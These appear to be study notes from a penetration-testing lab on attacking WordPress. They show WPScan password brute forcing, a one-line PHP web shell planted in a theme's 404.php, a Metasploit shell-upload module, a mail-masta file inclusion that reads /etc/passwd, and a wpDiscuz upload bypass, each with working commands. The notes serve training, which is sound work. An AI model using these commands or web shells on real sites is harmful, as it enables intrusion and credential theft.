- There are several ways we can abuse `built-in functionality` to attack a WordPress installation. 
- We will cover **==login brute forcing== against the `wp-login.php` page and ==remote code execution== via the theme editor**. 
- These two tactics build on each other as we need first to obtain valid credentials for an administrator-level user to log in to the WordPress back-end and edit a theme.

# Login Bruteforce
---
- **==WPScan can be used to brute force usernames and passwords.==** 
- The scan report in the previous section returned **two users registered on the website (admin and john)**. 
- The tool uses t**wo kinds of login brute force attacks**, **==[xmlrpc](https://kinsta.com/blog/xmlrpc-php/)==** and **==wp-login==**. 
- The **`wp-login` method will attempt to brute force the standard WordPress login page**, 
- while the ==**`xmlrpc` method uses WordPress API== to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as ==it’s faster**.==


	- $`sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`
	- ![[Pasted image 20260512005029.png]]

	- The **`--password-attack` flag is used to supply the type of attack.**
	- **The `-U` argument takes in a list of users or a file** containing user names. 
	- This applies to **the `-P` passwords option as well**. 
	- The **`-t` flag is the number of threads** which we can adjust up or down depending.


# Code Execution
---
- With **==administrative access to WordPress, we can modify the PHP source code to execute system commands==**.
	- **Log in to WordPress** with the credentials for the `john` user, which will redirect us to the admin panel. 
	- **Click on `Appearance` on the side panel and select Theme Editor**. 
	- This page will **let us edit the PHP source code directly**. 
	- An **inactive theme can be selected to avoid corrupting the primary theme**. 
	- We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.
	- **Click on `Select` after selecting the theme,** and we can **==edit an uncommon page such as `404.php` to add a web shell.==**

		- `system($_GET[0]);`

- The code above should let us **execute commands via the GET parameter `0`**.
- We **==add this single line to the file just below the comments to avoid too much modification==** of the contents.
	- ![[Pasted image 20260512005708.png]]

- Click on **`Update File` at the bottom to save.** 
- We know that WordPress **==themes are located at `/wp-content/themes/<theme name>`==**. 
- We can **interact with the web shell via the browser or using `cURL`**. 
- As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.

	- $ `curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`


## Metasploit
- The **wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically.**
- The module uploads a **==malicious plugin and then uses it to execute a PHP Meterpreter shell.==** We first need to set the necessary options.
	- ![[Pasted image 20260512005907.png]]
- In this lab example, we **must ==specify both the vhost and the IP address, or the exploit will fail**== with the error `Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.
- Once we are satisfied with the setup, **we can type `exploit` and obtain a reverse shell.**
- From here, **we could start enumerating the host for sensitive data or paths for vertical/horizontal privilege escalation** and lateral movement.


- At the very least, our report should have an appendix section that lists the following information—more on this in a later module.
	- Exploited systems (hostname/IP and method of exploitation)
	- Compromised users (account name, method of compromise, account type (local or domain))
	- Artifacts created on systems
	- Changes (such as adding a local admin user or modifying group membership)


# Leveraging Known Vulnerabilities
---
- Over the years, WordPress core has suffered from its fair share of vulnerabilities, but the **==vast majority of them can be found in plugins==**. 
- According to the WordPress Vulnerability **==Statistics page hosted [here](https://wpscan.com/statistics), at the time of writing, there were 23,595 vulnerabilities==** in the WPScan database. These vulnerabilities can be broken down as follows:
	- 4% WordPress core
	- 89% plugins
	- 7% themes

- For this reason, we must be **==extremely thorough when enumerating a WordPress site as we may find plugins with recently discovered vulnerabilities==** or even old, unused/forgotten plugins that no longer serve a purpose on the site but can still be accessed.

Note: We can use the **[waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine**. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.


## Vulnerable Plugins - mail-masta

- Let's look at a few examples. 
- The **plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the years**.
- It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).

- Let's take a look at the **vulnerable code for the mail-masta** plugin:
```php
	<?php 
	
	include($_GET['pl']);
	global $wpdb;
	
	$camp_id=$_POST['camp_id'];
	$masta_reports = $wpdb->prefix . "masta_reports";
	$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");
	
	echo $count[0]->co;
	?>
```

- As we can see, **==the `pl` parameter allows us to include a file without any type of input validation or sanitization==**.
- Using this, we can i**nclude arbitrary files on the webserver**. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`:
	
	- `curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

## Vulnerable Plugins - wpDiscuz
---
- Based on the **==version number (7.0.4), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution==**. 
- The crux of the vulnerability is **a file upload bypass**. 
- wpDiscuz is intended only to allow image attachments. The file **==mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution==**. 
- More on the mime type detection functions bypass can be found [here](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/):
  
- The exploit script takes two parameters: -**u the URL and -p the path to a valid post**.
	- `python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`

- The exploit as written may fail, but **==we can use `cURL` to execute commands using the uploaded web shell.==** 
- We just **need to append `?cmd=` after the `.php` extension to run commands** which we can see in the exploit script:
	- `curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id`

# Q/A
---
- To find **==usernames using WPScan,==** use `-e u`:
	- `wpscan --url http://blog.inlanefreight.local/ -e u`
- Password bruteforce:
	- `wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`
	- ![[Pasted image 20260512015616.png]]
- `curl http://blog.inlanefreight.local/wp-content/themes/twentytwenty/404.php?cmd=whoami`
- Find the flag:
	- `curl http://blog.inlanefreight.local/wp-content/themes/twentytwenty/404.php?cmd=find+/+-name+flag*`